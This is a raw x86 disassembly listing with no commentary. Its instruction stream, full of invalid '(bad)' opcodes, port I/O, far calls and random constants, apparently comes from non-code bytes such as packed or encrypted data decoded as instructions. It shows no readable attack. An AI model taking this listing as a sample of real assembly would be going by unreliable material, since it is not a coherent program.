  419e3c:	lahf   
  419e3d:	jb     0x419eb3
  419e3f:	or     eax,0x83e22a4a
  419e44:	pop    ebp
  419e45:	sub    bh,0xc1
  419e48:	das    
  419e49:	sbb    eax,0xfe0b4683
  419e4e:	dec    edx
  419e4f:	ret    0xf58a
  419e52:	hlt    
  419e53:	mov    bh,0x8c
  419e55:	pop    edx
  419e56:	call   0x178c2214
  419e5b:	mov    ebx,0x4ddac293
  419e60:	jne    0x419ed7
  419e62:	and    al,0xb4
  419e64:	popf   
  419e65:	loope  0x419e2d
  419e67:	clc    
  419e68:	mov    ecx,0xbabc97b8
  419e6d:	sub    ch,dh
  419e6f:	sub    eax,0xdb15a70e
  419e74:	arpl   bx,bx
  419e76:	push   esp
  419e77:	ss cwde 
  419e79:	popa   
  419e7a:	cli    
  419e7b:	sbb    eax,0x3e942ce5
  419e80:	rcr    DWORD PTR [edi+ebp*4+0x5d6d16a5],0x89
  419e88:	repnz dec edi
  419e8a:	jbe    0x419eaa
  419e8c:	outs   dx,DWORD PTR ds:[esi]
  419e8d:	cmp    al,cl
  419e8f:	inc    esi
  419e90:	adc    al,0x72
  419e92:	xchg   esi,eax
  419e93:	mov    eax,ds:0x20e40249
  419e98:	addr16 jmp 0x8391:0x9b4742ad
  419ea0:	retf   
  419ea1:	sbb    ebx,esp
  419ea3:	out    dx,al
  419ea4:	jae    0x419f19
  419ea6:	icebp  
  419ea7:	loopne 0x419ecc
  419ea9:	add    BYTE PTR ds:0xe65ac6,al
  419eaf:	adc    edx,DWORD PTR [ebx]
  419eb1:	and    ebx,edx
  419eb3:	addr16 pop es
  419eb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419eb6:	rol    edi,0x5e
  419eb9:	adc    al,0xe
  419ebb:	pop    edx
  419ebc:	xor    esi,DWORD PTR [esi-0x50cc4c00]
  419ec2:	dec    eax
  419ec3:	push   ecx
  419ec4:	ins    BYTE PTR es:[edi],dx
  419ec5:	clc    
  419ec6:	mov    al,0x38
  419ec8:	sahf   
  419ec9:	mov    bh,BYTE PTR [ecx]
  419ecb:	imul   esi,ecx,0x753788d
  419ed1:	jo     0x419e71
  419ed3:	mov    eax,0x6f4ebbb2
  419ed8:	sub    ch,cl
  419eda:	call   0x1cf9:0xd91f33c2
  419ee1:	mov    ds:0xd8050c56,eax
  419ee6:	and    ebp,DWORD PTR [esi]
  419ee8:	or     DWORD PTR [edx],0xffffffca
  419eeb:	(bad)  
  419eec:	jmp    0x419f5c
  419eee:	jl     0x419efb
  419ef0:	outs   dx,DWORD PTR ds:[esi]
  419ef1:	add    BYTE PTR [edx],cl
  419ef3:	and    bl,BYTE PTR [edi-0x227088cb]
  419ef9:	bswap  eax
  419efb:	loopne 0x419f3b
  419efd:	aaa    
  419efe:	addr16 mov al,ds:0x64c4
  419f02:	(bad)  
  419f03:	mov    edi,0xd12628c5
  419f08:	in     eax,dx
  419f09:	test   BYTE PTR [ecx-0x58],bl
  419f0c:	push   0xffffffac
  419f0e:	inc    esp
  419f0f:	hlt    
  419f10:	add    DWORD PTR [eax+ecx*4],esi
  419f13:	sbb    ebp,DWORD PTR fs:[ecx]
  419f16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f17:	mov    WORD PTR [ebp+0x7767be61],fs
  419f1d:	jp     0x419f61
  419f1f:	xor    edi,DWORD PTR [ebx+0x7d]
  419f22:	jp     0x419f80
  419f24:	enter  0x7a47,0x59
  419f28:	in     eax,dx
  419f29:	jmp    0x419f2e
  419f2b:	je     0x419f2e
  419f2d:	test   DWORD PTR [eax-0x74],ebx
  419f30:	lds    ebp,FWORD PTR [ebx+0x1202915e]
  419f36:	push   eax
  419f37:	sbb    esi,DWORD PTR [ebp-0x1e98cb8c]
  419f3d:	ins    DWORD PTR es:[edi],dx
  419f3e:	pop    edi
  419f3f:	pop    ds
  419f40:	(bad)  
  419f41:	cmp    BYTE PTR [edx+0x7fb17d1a],bl
  419f47:	dec    edx
  419f48:	jg     0x419f0e
  419f4a:	adc    DWORD PTR ds:0x7b7a849e,edi
  419f50:	outs   dx,BYTE PTR ds:[esi]
  419f51:	daa    
  419f52:	jp     0x419f7c
  419f54:	adc    DWORD PTR [ebx-0x6bb6ffee],esp
  419f5a:	mov    WORD PTR [ebp-0x1b],es
  419f5d:	or     bh,ch
  419f5f:	dec    edx
  419f60:	popa   
  419f61:	enter  0x3b1c,0xb9
  419f65:	icebp  
  419f66:	sbb    al,BYTE PTR [esp+edi*4]
  419f69:	sahf   
  419f6a:	aam    0x63
  419f6c:	sub    eax,0xad901b7e
  419f71:	cmp    dl,BYTE PTR [eax-0x70d3ba5d]
  419f77:	(bad)  
  419f78:	sbb    ebp,DWORD PTR ds:0x3184fd17
  419f7e:	cmp    al,BYTE PTR [ecx]
  419f80:	loop   0x419fcc
  419f82:	pop    eax
  419f83:	pop    ds
  419f84:	retf   0x966f
  419f87:	push   esp
  419f88:	dec    eax
  419f89:	mov    esi,0x7614e8bd
  419f8e:	dec    ebp
  419f8f:	js     0x419f2d
  419f91:	jg     0x419fdd
  419f93:	aam    0x8e
  419f95:	push   cs
  419f96:	xor    cl,BYTE PTR [esi]
  419f98:	jno    0x419ff1
  419f9a:	add    al,0xe6
  419f9c:	shl    DWORD PTR [esi+eiz*8-0x12],cl
  419fa0:	nop
  419fa1:	imul   esp,DWORD PTR [edi+0x4cc861c1],0x43
  419fa8:	xchg   edi,eax
  419fa9:	pop    ds
  419faa:	ret    0x69bf
  419fad:	cmp    BYTE PTR [edi+0x2ad81bdf],bh
  419fb3:	out    dx,al
  419fb4:	and    al,0x5e
  419fb6:	sbb    dh,BYTE PTR [edx-0x69]
  419fb9:	mov    bl,0x54
  419fbb:	push   esi
  419fbc:	test   BYTE PTR [ebp-0x2466c7d0],al
  419fc2:	in     eax,dx
  419fc3:	xchg   ebx,eax
  419fc4:	pop    ebp
  419fc5:	gs ss fucomi st,st(1)
  419fc9:	test   eax,0x31a4a1f
  419fce:	lock addr16 std 
  419fd1:	xor    al,0xaa
  419fd3:	and    eax,0xca858ffd
  419fd8:	and    ch,BYTE PTR [eax+0x1e]
  419fdb:	inc    ecx
  419fdc:	pop    edi
  419fdd:	div    BYTE PTR [ebx]
  419fdf:	jnp    0x419fc9
  419fe1:	les    esp,FWORD PTR [eax-0x50a082ae]
  419fe7:	sub    ebp,ebx
  419fe9:	adc    ecx,esi
  419feb:	stos   DWORD PTR es:[edi],eax
  419fec:	xor    ecx,edi
  419fee:	and    al,BYTE PTR [edi+0x6e6b9001]
  419ff4:	add    BYTE PTR [ebp-0x31fa7b6a],al
  419ffa:	jmp    0x41a066
  419ffc:	add    dh,dh
  419ffe:	fwait
  419fff:	popa   
  41a000:	dec    esi
  41a001:	(bad)  
  41a002:	adc    bh,ch
  41a004:	xchg   ebx,eax
  41a005:	mov    edi,0x2e7adc62
  41a00a:	retf   
  41a00b:	and    BYTE PTR [edi-0x13340560],bl
  41a011:	sub    eax,0x8b87c32e
  41a016:	ror    BYTE PTR [esi],0xf9
  41a019:	mov    al,ds:0x84a6e640
  41a01e:	mov    esi,0xf968e6a
  41a023:	mov    esi,0x26ab423a
  41a028:	std    
  41a029:	xchg   DWORD PTR [eax],esp
  41a02b:	jae    0x419fd8
  41a02d:	popf   
  41a02e:	xlat   BYTE PTR ds:[ebx]
  41a02f:	pop    edx
  41a030:	dec    edx
  41a031:	mov    DWORD PTR [edx],ecx
  41a033:	jnp    0x41a00d
  41a035:	fucomip st,st(4)
  41a037:	sub    eax,0x345bc8ed
  41a03c:	xchg   esi,eax
  41a03d:	std    
  41a03e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a03f:	cmp    eax,0xe7f912e3
  41a044:	jg     0x419fdc
  41a046:	adc    DWORD PTR [ecx+0x13],edx
  41a049:	add    eax,edi
  41a04b:	sbb    cl,BYTE PTR [eax]
  41a04d:	jl     0x41a0b4
  41a04f:	leave  
  41a050:	push   cs
  41a051:	sbb    BYTE PTR [edi+0x30],bl
  41a054:	sbb    DWORD PTR [edi+0x6ed422c7],0xa507e07c
  41a05e:	inc    esp
  41a05f:	sub    ebx,DWORD PTR [ecx+ebx*8]
  41a062:	add    edx,DWORD PTR [esi+0x5e]
  41a065:	dec    DWORD PTR [ebx]
  41a067:	push   0xffffffbc
  41a069:	inc    eax
  41a06a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a06b:	dec    edi
  41a06c:	jle    0x41a09f
  41a06e:	inc    ebp
  41a06f:	lock repz cmp eax,DWORD PTR [edi+0x34ad8b65]
  41a077:	sar    DWORD PTR [ecx+0x63],1
  41a07a:	mov    ch,0xe5
  41a07c:	jg     0x41a04f
  41a07e:	jne    0x41a038
  41a080:	jbe    0x41a0f4
  41a082:	xchg   ebp,eax
  41a083:	repz inc esp
  41a085:	in     eax,dx
  41a086:	imul   ebx,DWORD PTR [edi-0x4f746e3f],0x321704d2
  41a090:	adc    DWORD PTR [esi-0x11],ebx
  41a093:	sub    BYTE PTR [ebp-0x7c],dh
  41a096:	outs   dx,DWORD PTR ds:[esi]
  41a097:	adc    eax,0x20a81856
  41a09c:	sub    al,0xa8
  41a09e:	fild   WORD PTR [edx+0x35c25db8]
  41a0a4:	int3   
  41a0a5:	and    al,0xd9
  41a0a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0a8:	cld    
  41a0a9:	jge    0x41a0f5
  41a0ab:	mov    ebp,0x1b077a59
  41a0b0:	mov    bh,0x4f
  41a0b2:	push   esi
  41a0b3:	je     0x41a0d7
  41a0b5:	mov    dl,0xb4
  41a0b7:	int    0x80
  41a0b9:	jns    0x41a137
  41a0bb:	retf   0xa94d
  41a0be:	push   ds
  41a0bf:	fild   DWORD PTR [edx]
  41a0c1:	(bad)
  41a0c6:	xchg   edi,eax
  41a0c7:	mov    WORD PTR [edx+ebx*1-0x51a0bc94],ds
  41a0ce:	out    dx,al
  41a0cf:	mov    cl,0x5c
  41a0d1:	push   es
  41a0d2:	cmp    bh,ah
  41a0d4:	fild   DWORD PTR [ebx+0x666e2e0d]
  41a0da:	cmc    
  41a0db:	mov    ah,0xb1
  41a0dd:	outs   dx,DWORD PTR ds:[esi]
  41a0de:	mov    edx,DWORD PTR [edi+0x553ef7ee]
  41a0e4:	and    ecx,DWORD PTR [edi+0x478d9e7c]
  41a0ea:	sub    ebp,0xffffffeb
  41a0ed:	or     DWORD PTR [edx],eax
  41a0ef:	rcr    DWORD PTR [edi],1
  41a0f1:	and    bh,BYTE PTR [edi+edi*8]
  41a0f4:	je     0x41a150
  41a0f6:	cmp    al,BYTE PTR [ebx]
  41a0f8:	pop    esi
  41a0f9:	stos   DWORD PTR es:[edi],eax
  41a0fa:	mov    al,ds:0xf767605d
  41a0ff:	and    eax,0x763d999c
  41a104:	mov    edx,0x6c79e3e6
  41a109:	je     0x41a0ae
  41a10b:	adc    DWORD PTR [esi],ecx
  41a10d:	xor    al,0x21
  41a10f:	cmp    BYTE PTR [ecx+0x44],ah
  41a112:	ds ds loop 0x41a103
  41a116:	shrd   DWORD PTR [eax-0x18735b11],ebx,cl
  41a11d:	mov    esp,DWORD PTR [eax]
  41a11f:	rol    BYTE PTR [edi-0x73],cl
  41a122:	(bad)  
  41a124:	sub    eax,0xbbd2985f
  41a129:	(bad)
  41a12c:	hlt    
  41a12d:	inc    edi
  41a12e:	fsub   QWORD PTR [ebp-0x9]
  41a131:	add    eax,0xb2ff8446
  41a136:	inc    eax
  41a137:	sbb    eax,0x5ba346d1
  41a13c:	addr16 inc esp
  41a13e:	xchg   edi,eax
  41a13f:	inc    edi
  41a140:	rol    dh,0xb
  41a143:	jb     0x41a193
  41a145:	sbb    ebp,DWORD PTR [ebp-0x23]
  41a148:	into   
  41a149:	in     al,0xd1
  41a14b:	jo     0x41a178
  41a14d:	ret    
  41a14e:	neg    DWORD PTR [ebx+0x6e]
  41a151:	call   DWORD PTR [ecx-0x5bfc851c]
  41a157:	aas    
  41a158:	mov    ebx,0xc9f874cf
  41a15d:	cs fldpi 
  41a160:	jl     0x41a0ee
  41a162:	nop
  41a163:	xchg   bl,bl
  41a165:	bound  ebp,QWORD PTR [eax+esi*8]
  41a168:	and    al,0xe5
  41a16a:	mov    dh,0x55
  41a16c:	adc    dh,BYTE PTR [ebp+0x1b722132]
  41a172:	shl    BYTE PTR [esi-0x6d],cl
  41a175:	sub    al,0xb9
  41a177:	jno    0x41a1ba
  41a179:	jp     0x41a1c7
  41a17b:	adc    ch,BYTE PTR [esi]
  41a17d:	test   ch,ah
  41a17f:	mov    esi,0x5502b49e
  41a184:	js     0x41a1df
  41a186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a187:	pop    ecx
  41a188:	test   ecx,edi
  41a18a:	(bad)  
  41a18b:	adc    al,BYTE PTR [ebx]
  41a18d:	xor    DWORD PTR [ebp+0x50191513],eax
  41a193:	pop    esi
  41a194:	jb     0x41a1a2
  41a196:	jns    0x41a17b
  41a198:	cdq    
  41a199:	stos   DWORD PTR es:[edi],eax
  41a19a:	inc    ebp
  41a19b:	pop    eax
  41a19c:	in     al,dx
  41a19d:	xor    al,0x88
  41a19f:	icebp  
  41a1a0:	cmp    ecx,DWORD PTR [eax-0x63238efd]
  41a1a6:	push   edx
  41a1a7:	mov    esp,0xcfd219bc
  41a1ac:	sahf   
  41a1ad:	mov    ch,BYTE PTR [ecx+eiz*8]
  41a1b0:	ins    DWORD PTR es:[edi],dx
  41a1b1:	outs   dx,BYTE PTR ds:[esi]
  41a1b2:	into   
  41a1b3:	jno    0x41a220
  41a1b5:	in     al,dx
  41a1b6:	inc    edx
  41a1b7:	adc    eax,0xd8b47cbc
  41a1bc:	js     0x41a22f
  41a1be:	inc    esp
  41a1bf:	push   ss
  41a1c0:	adc    DWORD PTR [ebp+0x5a],esi
  41a1c3:	xor    ebp,ebx
  41a1c5:	mov    esi,0xa4bb43a3
  41a1ca:	pop    edx
  41a1cb:	pop    ebx
  41a1cc:	ins    DWORD PTR es:[edi],dx
  41a1cd:	xchg   edi,eax
  41a1ce:	and    eax,0x456ab69c
  41a1d3:	pop    ss
  41a1d4:	pop    ds
  41a1d5:	cmp    cl,dh
  41a1d7:	lahf   
  41a1d8:	daa    
  41a1d9:	sbb    al,0x10
  41a1db:	jnp    0x41a1e3
  41a1dd:	std    
  41a1de:	imul   esp,esi,0x89af2fe3
  41a1e4:	into   
  41a1e5:	add    edi,DWORD PTR [ebx]
  41a1e7:	mov    edx,edx
  41a1e9:	push   cs
  41a1ea:	lahf   
  41a1eb:	xor    ecx,DWORD PTR [ebp+0x32]
  41a1ee:	or     DWORD PTR [eax],ecx
  41a1f0:	fwait
  41a1f1:	cs inc esp
  41a1f3:	daa    
  41a1f4:	test   al,0x86
  41a1f6:	mov    ebp,0xd7a84a6a
  41a1fb:	add    eax,0x7d08517
  41a200:	int    0xbc
  41a202:	ins    BYTE PTR es:[edi],dx
  41a203:	ins    BYTE PTR es:[edi],dx
  41a204:	push   esi
  41a205:	(bad)  
  41a206:	scas   al,BYTE PTR es:[edi]
  41a207:	scas   eax,DWORD PTR es:[edi]
  41a208:	scas   eax,DWORD PTR es:[edi]
  41a209:	outs   dx,DWORD PTR ds:[esi]
  41a20a:	popa   
  41a20b:	xchg   ecx,eax
  41a20c:	push   edi
  41a20d:	addr16 xchg ebx,eax
  41a20f:	popa   
  41a210:	imul   ebx,edx,0x69
  41a213:	xchg   esi,eax
  41a214:	push   ss
  41a215:	adc    eax,0x2eecdc1b
  41a21a:	cld    
  41a21b:	inc    esp
  41a21c:	ja     0x41a20a
  41a21e:	shl    BYTE PTR [ebx],cl
  41a220:	xchg   BYTE PTR [edi],al
  41a222:	add    al,BYTE PTR [ecx]
  41a224:	push   ebx
  41a225:	pop    ebp
  41a226:	(bad)  
  41a228:	xchg   DWORD PTR [ecx+0x7],edx
  41a22b:	test   eax,0x4979dde4
  41a230:	and    al,0x2c
  41a232:	pushw  0x6c84
  41a236:	ja     0x41a1c3
  41a238:	std    
  41a239:	scas   al,BYTE PTR es:[edi]
  41a23a:	in     eax,dx
  41a23b:	xor    dl,al
  41a23d:	rcl    BYTE PTR [edi],cl
  41a23f:	pop    esp
  41a240:	push   es
  41a241:	test   al,0x65
  41a243:	cld    
  41a244:	push   cs
  41a245:	pop    eax
  41a246:	pop    ebx
  41a247:	mov    eax,ds:0x54225039
  41a24c:	mov    cl,0xff
  41a24e:	or     DWORD PTR [esi],eax
  41a250:	outs   dx,BYTE PTR ds:[esi]
  41a251:	div    BYTE PTR [ecx-0x37]
  41a254:	jle    0x41a286
  41a256:	sahf   
  41a257:	outs   dx,DWORD PTR ds:[esi]
  41a258:	data16 shl BYTE PTR [edi+esi*8],cl
  41a25c:	mov    bh,0x70
  41a25e:	(bad)  
  41a260:	sbb    al,0x2
  41a262:	inc    ebp
  41a263:	adc    ebp,ebx
  41a265:	and    DWORD PTR ds:0xcb2c6215,0x220c5621
  41a26f:	loope  0x41a2ee
  41a271:	retf   0xca8b
  41a274:	sub    DWORD PTR [edx-0x1d],ebx
  41a277:	adc    al,0x17
  41a279:	mov    dh,BYTE PTR [ecx+0x4565fda1]
  41a27f:	hlt    
  41a280:	jnp    0x41a27f
  41a282:	add    ah,BYTE PTR [edi-0x14]
  41a285:	retf   
  41a286:	jns    0x41a268
  41a288:	cmc    
  41a289:	arpl   WORD PTR [esi+0x74d7b3e6],bp
  41a28f:	loop   0x41a248
  41a291:	adc    DWORD PTR [ecx+0x27],0x849a3e19
  41a298:	inc    esp
  41a299:	and    BYTE PTR ds:0xdc99d8b7,al
  41a29f:	sbb    esp,DWORD PTR [eax-0x51]
  41a2a2:	jno    0x41a2cd
  41a2a4:	imul   ebx,DWORD PTR [esi-0x5c],0xffffffc0
  41a2a8:	and    bl,dh
  41a2aa:	push   ecx
  41a2ab:	int3   
  41a2ac:	xor    DWORD PTR [eax],edi
  41a2ae:	dec    esi
  41a2af:	rep stos DWORD PTR es:[edi],eax
  41a2b1:	popa   
  41a2b2:	fsub   st(5),st
  41a2b4:	inc    ecx
  41a2b5:	rcl    BYTE PTR ds:0x60e1e877,1
  41a2bb:	imul   eax,esi,0x16
  41a2be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2bf:	imul   edx,DWORD PTR ds:0x73d9995b,0xf124e4d8
  41a2c9:	push   edx
  41a2ca:	popa   
  41a2cb:	inc    ecx
  41a2cc:	ret    0xc02e
  41a2cf:	mov    cl,0xf8
  41a2d1:	push   0xffffff9b
  41a2d3:	sbb    al,0xf3
  41a2d5:	inc    ebp
  41a2d6:	jg     0x41a314
  41a2d8:	mov    eax,ds:0x9c82695b
  41a2dd:	inc    edi
  41a2de:	test   DWORD PTR ds:0x1bb4ea4b,ebx
  41a2e4:	(bad)  
  41a2e5:	aaa    
  41a2e6:	xchg   ah,ah
  41a2e8:	fst    DWORD PTR [edx+0x7b]
  41a2eb:	out    dx,al
  41a2ec:	adc    eax,0x5b
  41a2ef:	or     al,0x7a
  41a2f1:	aaa    
  41a2f2:	mov    BYTE PTR [eax-0x3c],bl
  41a2f5:	ds cmp eax,0x6b1601e4
  41a2fb:	aad    0x40
  41a2fd:	daa    
  41a2fe:	call   0xac26:0x1ef1884b
  41a305:	push   es
  41a306:	popa   
  41a307:	cmp    BYTE PTR [ebp+0x42d8f9ef],dh
  41a30d:	icebp  
  41a30e:	call   0x40504ae3
  41a313:	inc    ebp
  41a314:	dec    edx
  41a315:	inc    ebx
  41a316:	add    DWORD PTR [ebp-0x3f],ebp
  41a319:	adc    bh,bh
  41a31b:	jo     0x41a37c
  41a31d:	dec    ebp
  41a31e:	ror    BYTE PTR [edi+esi*8+0x18],0xc2
  41a323:	int    0x64
  41a325:	cmp    DWORD PTR [ecx],eax
  41a327:	ret    0xc9c4
  41a32a:	add    bl,ch
  41a32c:	dec    edi
  41a32d:	mov    esi,0x6d48dec4
  41a332:	pushf  
  41a333:	or     eax,0x10d090db
  41a338:	std    
  41a339:	mov    al,ds:0x717fc326
  41a33e:	xor    DWORD PTR [edx],esp
  41a340:	sbb    BYTE PTR [eax],al
  41a342:	in     al,dx
  41a343:	dec    esi
  41a344:	push   esp
  41a345:	out    0x45,eax
  41a347:	cmp    ah,bl
  41a349:	pushw  ds
  41a34b:	mov    ch,0xa4
  41a34d:	test   eax,0xe81b5d6f
  41a352:	pop    edi
  41a353:	ins    DWORD PTR es:[edi],dx
  41a354:	mov    BYTE PTR [esi-0x4973f1d4],cl
  41a35a:	jnp    0x41a322
  41a35c:	push   edx
  41a35d:	add    al,0xfa
  41a35f:	dec    ebp
  41a360:	cmc    
  41a361:	pushf  
  41a362:	jg     0x41a32a
  41a364:	and    al,0x99
  41a366:	or     al,0x6
  41a368:	mov    ecx,0xcb81dc3
  41a36d:	out    dx,al
  41a36e:	ror    DWORD PTR [edx-0x34ba61b3],cl
  41a374:	outs   dx,DWORD PTR ds:[esi]
  41a375:	push   es
  41a376:	fdivr  DWORD PTR [edi+0x1c]
  41a379:	imul   esi
  41a37b:	call   0x7ccc60f7
  41a380:	or     BYTE PTR [eax],0xee
  41a383:	mov    bl,0x4d
  41a385:	jg     0x41a32b
  41a387:	sbb    DWORD PTR [eax],edx
  41a389:	test   al,0x56
  41a38b:	loope  0x41a3f9
  41a38d:	imul   esi,DWORD PTR [ecx],0x66675c64
  41a393:	inc    ecx
  41a394:	sahf   
  41a395:	sub    ebp,DWORD PTR ss:[ecx-0x5]
  41a399:	mov    esi,DWORD PTR [ebp-0x40]
  41a39c:	(bad)  
  41a39d:	push   ebx
  41a39e:	inc    ecx
  41a39f:	ja     0x41a3ee
  41a3a1:	lea    ebx,[edi+0x1a]
  41a3a4:	loop   0x41a3ac
  41a3a6:	pop    esp
  41a3a7:	sbb    ch,ch
  41a3a9:	or     edi,0xe
  41a3ac:	adc    DWORD PTR [edx],edx
  41a3ae:	cwde   
  41a3af:	jge    0x41a409
  41a3b1:	(bad)  
  41a3b2:	movhlps xmm3,xmm5
  41a3b5:	add    eax,0xf2a1f818
  41a3ba:	sar    BYTE PTR [esi+0x558cd2e0],0xf4
  41a3c1:	and    edx,DWORD PTR [esi-0x3d]
  41a3c4:	(bad)  
  41a3c5:	mov    eax,0xc7ddb5c1
  41a3ca:	ins    DWORD PTR es:[edi],dx
  41a3cb:	int    0xdf
  41a3cd:	js     0x41a414
  41a3cf:	mov    esp,0x7fff419c
  41a3d4:	out    0x69,eax
  41a3d6:	jp     0x41a407
  41a3d8:	nop
  41a3d9:	sti    
  41a3da:	and    al,BYTE PTR [esp+eax*2]
  41a3dd:	call   0x643cc6ab
  41a3e2:	shl    bl,1
  41a3e4:	fld    QWORD PTR [ecx-0x2d]
  41a3e7:	mov    dl,0xad
  41a3e9:	clc    
  41a3ea:	mov    bh,dl
  41a3ec:	call   0xaacb:0xe813b3bb
  41a3f3:	fnsave [eax+0x53949868]
  41a3f9:	mov    ds:0xccadfd68,al
  41a3fe:	push   esi
  41a3ff:	lods   eax,DWORD PTR ds:[esi]
  41a400:	mov    DWORD PTR [ecx],ecx
  41a402:	mov    cl,0x46
  41a404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a405:	stos   BYTE PTR es:[edi],al
  41a406:	imul   esi,DWORD PTR [ebp-0x307bfda1],0x28e36d3f
  41a410:	and    eax,0x389fd52
  41a415:	jp     0x41a3bf
  41a417:	jno    0x41a41e
  41a419:	or     DWORD PTR [eax-0x55333617],esp
  41a41f:	mov    esi,0x8b856f34
  41a424:	shl    DWORD PTR [esi+0x444b4b],1
  41a42a:	call   0x14f6e04a
  41a42f:	repnz xchg ebp,eax
  41a431:	dec    esp
  41a432:	or     esi,ebp
  41a434:	mov    esp,0x61241132
  41a439:	push   ds
  41a43a:	pop    ds
  41a43b:	imul   eax,esp,0x2b
  41a43e:	les    ebx,FWORD PTR [ebx+0x7dc3244f]
  41a444:	clc    
  41a445:	cmc    
  41a446:	jecxz  0x41a486
  41a448:	mov    ebp,0x8d20ada0
  41a44d:	leave  
  41a44e:	stc    
  41a44f:	dec    ebx
  41a450:	call   0x6676:0x89e89a8c
  41a457:	loopne 0x41a4ca
  41a459:	bnd addr16 jno 0x41a4c8
  41a45d:	test   DWORD PTR [edx-0x3d3cf371],0x8bc8c164
  41a467:	fyl2x  
  41a469:	and    BYTE PTR [ecx+0x60],dh
  41a46c:	push   0x1c
  41a46e:	push   eax
  41a46f:	into   
  41a470:	adc    ah,al
  41a472:	xchg   ebx,eax
  41a474:	stc    
  41a475:	xchg   edi,eax
  41a476:	mov    ebx,DWORD PTR [ecx+0x69f129eb]
  41a47c:	mov    bl,0x5c
  41a47e:	xchg   ecx,eax
  41a47f:	mov    WORD PTR [edi+eiz*1+0x644424fd],ss
  41a486:	ja     0x41a446
  41a488:	mov    cl,0xc1
  41a48a:	sub    eax,DWORD PTR [ecx-0x19d7e0ea]
  41a490:	pop    ecx
  41a491:	xor    eax,0x7224cdbc
  41a496:	cmp    al,0xbe
  41a498:	mov    ds,WORD PTR [ebx-0x2b]
  41a49b:	pop    ebp
  41a49c:	lock bound eax,QWORD PTR [esi]
  41a49f:	sub    eax,0x13c4d9b6
  41a4a4:	cmovno ecx,DWORD PTR ds:0x95d3927
  41a4ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4ac:	adc    eax,DWORD PTR [edx+edx*8-0x62]
  41a4b0:	dec    esi
  41a4b1:	iret   
  41a4b2:	dec    edi
  41a4b3:	xor    al,0xf6
  41a4b5:	(bad)  
  41a4b6:	add    ebp,esp
  41a4b8:	mov    eax,0xe62d0c6f
  41a4bd:	test   eax,0x68f662a8
  41a4c2:	cwde   
  41a4c3:	jne    0x41a488
  41a4c5:	cld    
  41a4c6:	sahf   
  41a4c7:	push   ebp
  41a4c8:	dec    ecx
  41a4c9:	mov    al,0xb1
  41a4cb:	outs   dx,BYTE PTR ds:[esi]
  41a4cc:	daa    
  41a4cd:	jno    0x41a4d4
  41a4cf:	jbe    0x41a4cd
  41a4d1:	sbb    BYTE PTR gs:[eax-0x9d53d3a],ah
  41a4d8:	or     eax,0xd2a072c7
  41a4dd:	scas   al,BYTE PTR es:[edi]
  41a4de:	int    0x5c
  41a4e0:	xlat   BYTE PTR ds:[ebx]
  41a4e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4e2:	pop    eax
  41a4e3:	gs xor ebp,esi
  41a4e6:	adc    al,BYTE PTR [ebx]
  41a4e8:	(bad)  
  41a4e9:	test   eax,0x14e195d3
  41a4ee:	xor    al,0xd
  41a4f0:	cld    
  41a4f1:	adc    al,BYTE PTR [edi-0x44c67252]
  41a4f7:	ins    BYTE PTR es:[edi],dx
  41a4f8:	test   eax,0x2d339673
  41a4fd:	xor    edx,DWORD PTR [eax]
  41a4ff:	mov    al,BYTE PTR [ebx-0x4d]
  41a502:	les    esi,FWORD PTR [ecx+esi*4+0x6b]
  41a506:	int    0x18
  41a508:	xor    edx,0xa4af9731
  41a50e:	int    0xe9
  41a510:	add    eax,0xba53eda0
  41a515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a516:	leave  
  41a517:	inc    edx
  41a518:	mov    ds:0x27d78d64,eax
  41a51d:	mov    ah,ch
  41a51f:	inc    ebp
  41a520:	mov    eax,0x591e8cd5
  41a525:	push   esp
  41a526:	test   DWORD PTR [eax],edi
  41a528:	jnp    0x41a543
  41a52a:	push   ebp
  41a52b:	or     al,BYTE PTR [eax+0x52]
  41a52e:	ret    0x7d8c
  41a531:	mov    DWORD PTR [edi],esp
  41a533:	test   DWORD PTR [esp+ebp*1],0x4f10fc16
  41a53a:	sbb    esp,esi
  41a53c:	cwde   
  41a53d:	sub    DWORD PTR [eax-0x385efa4],ebp
  41a543:	xchg   BYTE PTR ds:0xe28094bc,al
  41a549:	popf   
  41a54a:	mov    dh,0x98
  41a54c:	fnsave [ecx-0x38]
  41a54f:	retf   0x8baf
  41a552:	sub    BYTE PTR [edi+0x28],0x4e
  41a556:	not    DWORD PTR [eax+ebx*1+0x3157f3e4]
  41a55d:	mul    ch
  41a55f:	(bad)  
  41a561:	loope  0x41a596
  41a563:	sub    esi,edx
  41a565:	jbe    0x41a57d
  41a567:	sbb    DWORD PTR [esi],esp
  41a569:	lahf   
  41a56a:	lahf   
  41a56b:	out    0xf7,eax
  41a56d:	ror    DWORD PTR [ebp+eiz*8+0x766bfafa],0x90
  41a575:	xchg   esi,eax
  41a576:	pop    esi
  41a577:	sbb    al,0x63
  41a579:	or     eax,0xd93a6687
  41a57e:	dec    esp
  41a57f:	and    eax,0x83614b91
  41a584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a585:	pop    eax
  41a586:	xchg   esi,eax
  41a587:	stos   BYTE PTR es:[edi],al
  41a588:	and    eax,0x94901ac5
  41a58d:	inc    edi
  41a58e:	push   ss
  41a58f:	xchg   edx,esi
  41a591:	jp     0x41a537
  41a593:	sub    edx,DWORD PTR [esp+eiz*4]
  41a596:	jo     0x41a55f
  41a598:	add    BYTE PTR [eax+0x7b],ch
  41a59b:	sub    dh,BYTE PTR [ebx-0x50adcf52]
  41a5a1:	jecxz  0x41a569
  41a5a3:	and    DWORD PTR ss:[edi-0x39],eax
  41a5a7:	(bad)  
  41a5a8:	(bad)  
  41a5a9:	jp     0x41a54b
  41a5ab:	in     eax,dx
  41a5ac:	sbb    edi,ebx
  41a5ae:	adc    ch,BYTE PTR [eax]
  41a5b0:	cli    
  41a5b1:	sbb    DWORD PTR [ebp+0x56],ebp
  41a5b4:	clc    
  41a5b5:	call   0xa84451ab
  41a5ba:	adc    al,0x7a
  41a5bc:	daa    
